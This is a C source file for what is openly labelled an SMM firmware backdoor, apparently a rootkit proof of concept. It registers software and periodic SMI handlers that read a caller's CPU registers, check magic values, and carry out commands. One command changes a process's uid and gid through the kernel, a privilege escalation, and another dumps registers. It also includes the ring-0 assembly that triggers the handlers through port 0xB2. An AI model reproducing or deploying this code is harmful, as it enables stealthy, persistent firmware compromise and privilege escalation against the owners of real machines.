#include "smm.h"
#include "AutoGen.h"
#include "Framework/SmmCis.h"
#include "Protocol/SmmCpu.h"
#include "Protocol/SmmSwDispatch.h"
#include "Protocol/SmmPeriodicTimerDispatch.h"
#include "Uefi/UefiBaseType.h"
#include "Universal/DisplayEngineDxe/FormDisplay.h"
#include "efivars.h"
#include "globals.h"
#include "kernel.h"

#include "ioctl.h"

#define PAGE_SHIFT		12
#define PTI_SWITCH_MASK         (1 << PAGE_SHIFT)

static UINT64 gSmiInterval = 640000;
static UINT64 gBackdoorWakeupPeriod = 1000000;

static EFI_SMM_SYSTEM_TABLE* gStmt;
static EFI_SMM_BASE_PROTOCOL* gSmmBase;
static EFI_SMM_SW_DISPATCH_PROTOCOL* gSwDispatch;
static EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL* gPeriodicTimer;
static EFI_SMM_CPU_PROTOCOL* gSmmCpu;

static EFI_HANDLE gBackdoorIsrHandle;
static EFI_SMM_SW_DISPATCH_CONTEXT gBackdoorIsrCtx = {
    .SwSmiInputValue = API_BACKDOOR_CALL
};

static EFI_SMM_PERIODIC_TIMER_DISPATCH_CONTEXT gPeriodicTimerContext;
static EFI_HANDLE gPeriodicTimerHandle;

static const UINT64 BACKDOOR_CALL_REGISTERS[] = {
    EFI_SMM_SAVE_STATE_REGISTER_RSI,
    EFI_SMM_SAVE_STATE_REGISTER_RDI,
    EFI_SMM_SAVE_STATE_REGISTER_RCX,
    EFI_SMM_SAVE_STATE_REGISTER_RDX,
    EFI_SMM_SAVE_STATE_REGISTER_R8,
    EFI_SMM_SAVE_STATE_REGISTER_R9
};

struct ControlRegs gControlRegs; 

static EFI_STATUS register_periodic_interrupt();
static EFI_STATUS unregister_periodic_interrupt();

static void backdoor_read_params(struct BackdoorParams* params, UINT32 cpu) {
    for (UINT32 i=0; i < 6; ++i) {
        gSmmCpu->ReadSaveState(
                    gSmmCpu, sizeof(params->r[i]), BACKDOOR_CALL_REGISTERS[i], cpu, (void *) &params->r[i]
                );
    }
}

static void backdoor_write_params(struct BackdoorParams* params, UINT32 cpu) {
    for (UINT32 i=0; i < 6; ++i) {
        gSmmCpu->WriteSaveState(
                    gSmmCpu, sizeof(params->r[i]), BACKDOOR_CALL_REGISTERS[i], cpu, (const void *) &params->r[i]
                );
    }
}

static void backdoor_save_control_regs(UINT32 cpu) {
    gSmmCpu->ReadSaveState(gSmmCpu, sizeof(UINT64), EFI_SMM_SAVE_STATE_REGISTER_CR0, cpu, &gControlRegs.Cr0);
    gSmmCpu->ReadSaveState(gSmmCpu, sizeof(UINT64), EFI_SMM_SAVE_STATE_REGISTER_CR3, cpu, &gControlRegs.Cr3);
    gControlRegs.Cr3Kernel = gControlRegs.Cr3 & (~PTI_SWITCH_MASK);
}

static BOOLEAN is_valid_request(struct BackdoorParams* params) {
    return params->r[4] == BACKDOOR_MAGIC1 && params->r[5] == BACKDOOR_MAGIC2;
}

static void backdoor_api_hello_world_test(struct BackdoorParams* params) {
    params->r[0] = 0xDEADBEEFDEADBEEF;
    params->r[1] = 0x4141414141414141;
    params->r[2] = 0x4242424242424242;
    params->r[3] = 0x1337133773317331;
    params->r[4] = 0x4141414141414141;
    params->r[5] = 0x4141414141414141;
}

static void backdoor_api_get_current_cpu(struct BackdoorParams* params) {
    params->r[0] = gStmt->CurrentlyExecutingCpu;
}

static void backdoor_api_wakeup(struct BackdoorParams* params) {
    unregister_periodic_interrupt();
    params->r[0] = register_periodic_interrupt();
}

static void backdoor_api_change_priv(struct BackdoorParams* params, UINT32 cpu) {
    if (gStmt->CurrentlyExecutingCpu == cpu) {
        UINT32 uid = params->r[1];
        UINT32 gid = params->r[2];

        backdoor_save_control_regs(cpu);
        params->r[0] = kernel_change_priv(uid, gid);
    } else {
        params->r[0] = EFI_INVALID_PARAMETER;
    }
}

static void backdoor_api_dump_register(struct BackdoorParams* params, UINT32 cpu) {
    params->r[0] = gSmmCpu->ReadSaveState(gSmmCpu, sizeof(params->r[1]), params->r[1], cpu, &params->r[1]);
}

static BOOLEAN handle_cpu_core(UINT32 cpu) {
    struct BackdoorParams params;
    backdoor_read_params(&params, cpu);

    if (is_valid_request(&params)) {
        const UINT8 request = params.r[0] & 0xFF;

        switch (request) {
            case BACKDOOR_HELLO_WORLD_TEST:
                backdoor_api_hello_world_test(&params);
                break;

            case BACKDOOR_WAKEUP:
                backdoor_api_wakeup(&params);
                break;

            case BACKDOOR_GET_CURRENT_CPU:
                backdoor_api_get_current_cpu(&params);
                break;

            case BACKDOOR_CHANGE_PRIV:
                backdoor_api_change_priv(&params, cpu);
                break;

            case BACKDOOR_DUMP_REG:
                backdoor_api_dump_register(&params, cpu);
                break;

        }

        backdoor_write_params(&params, cpu);
        return TRUE;
    }

    return FALSE;
}

static void EFIAPI backdoor_smi_handler(EFI_HANDLE dispatch_handle, EFI_SMM_SW_DISPATCH_CONTEXT * dispatch_ctx) {
    for (UINT32 i=0; i < gStmt->NumberOfCpus; ++i) {
        handle_cpu_core(i);
    }
}

static void EFIAPI backdoor_periodic_handler(EFI_HANDLE handle, EFI_SMM_PERIODIC_TIMER_DISPATCH_CONTEXT* ctx) {
    for (UINT32 i=0; i < gStmt->NumberOfCpus; ++i) {
        if (handle_cpu_core(i)) {
            UINT64 rax = 0;
            gSmmCpu->ReadSaveState(gSmmCpu, sizeof(rax), EFI_SMM_SAVE_STATE_REGISTER_RAX, i, (void *) &rax); 
            
            if (rax == 0)
                rax = 1;

            gSmmCpu->WriteSaveState(gSmmCpu, sizeof(rax), EFI_SMM_SAVE_STATE_REGISTER_RAX, i, (const void *) &rax);
        }
    }
}
static EFI_STATUS register_periodic_interrupt() {
    gPeriodicTimerContext.Period = gBackdoorWakeupPeriod;
    gPeriodicTimerContext.SmiTickInterval = gSmiInterval;
    
    return gPeriodicTimer->Register(gPeriodicTimer, &backdoor_periodic_handler, &gPeriodicTimerContext, &gPeriodicTimerHandle);
}

static EFI_STATUS unregister_periodic_interrupt() {
    return gPeriodicTimer->UnRegister(gPeriodicTimer, gPeriodicTimerHandle); 
}

void backdoor_smm_entry(EFI_SMM_BASE_PROTOCOL* smm_base) {
    gSmmBase = smm_base;
    EFI_STATUS status = smm_base->GetSmstLocation(smm_base, &gStmt);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannto get EFI_SMM_STATUS_TABLE");
        return;
    } 

    status = gBS->LocateProtocol(&gEfiSmmSwDispatchProtocolGuid, NULL, (void **) &gSwDispatch);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_SW_DISPATCH_PROTOCOL");
        return;
    }

    status = gBS->LocateProtocol(&gEfiSmmPeriodicTimerDispatchProtocolGuid, NULL, (void **) &gPeriodicTimer);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL");
        return;
    }

    status = gBS->LocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (void **) &gSmmCpu);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_CPU_PROTOCOL");
        return;
    }

    status = gSwDispatch->Register(gSwDispatch, &backdoor_smi_handler, &gBackdoorIsrCtx, &gBackdoorIsrHandle);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot register SMI handler.");
        return;
    }

    status = register_periodic_interrupt();
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot register periodic interrupt.");
        return;
    }

    set_backdoor_efivar_str(SmmVar, "SMM_INIT_OK");
}

// ring 0 code called from relocated Dxe driver

static void smm_backdoor_call(struct BackdoorParams* params) {

    const UINT16 SMM_PORT = 0xB2;
    const UINT8 SMI_BACKDOOR_SMI = API_BACKDOOR_CALL;

    asm volatile (
        "                        \n\
            mov %6, %%rsi        \n\
            mov %7, %%rdi        \n\
            mov %8, %%rcx        \n\
            mov %9, %%rdx        \n\
            mov %10, %%r8        \n\
            mov %11, %%r9        \n\
            outb %12, %13        \n\
            mov %%r9 , %5        \n\
            mov %%r8 , %4        \n\
            mov %%rdx, %3        \n\
            mov %%rcx, %2        \n\
            mov %%rdi, %1        \n\
            mov %%rsi, %0        \n\
        "
        :   "=m"(params->r[0]), "=m"(params->r[1]), "=m"(params->r[2]), \
            "=m"(params->r[3]), "=m"(params->r[4]), "=m"(params->r[5])
        :   "m"(params->r[0]), "m"(params->r[1]), "m"(params->r[2]),    \
            "m"(params->r[3]), "m"(params->r[4]), "m"(params->r[5]),    \
            "a"(SMI_BACKDOOR_SMI), "Nd"(SMM_PORT)
        :   "rsi", "rdi", "rcx", "rdx", "r8", "r9"
    );
}

EFI_STATUS backdoor_wakeup() {
    struct BackdoorParams params = {
        .r = {
            BACKDOOR_WAKEUP,
            0,
            0,
            0,
            BACKDOOR_MAGIC1,
            BACKDOOR_MAGIC2
        }
    };

    smm_backdoor_call(&params);

    return (EFI_STATUS) params.r[0];
}
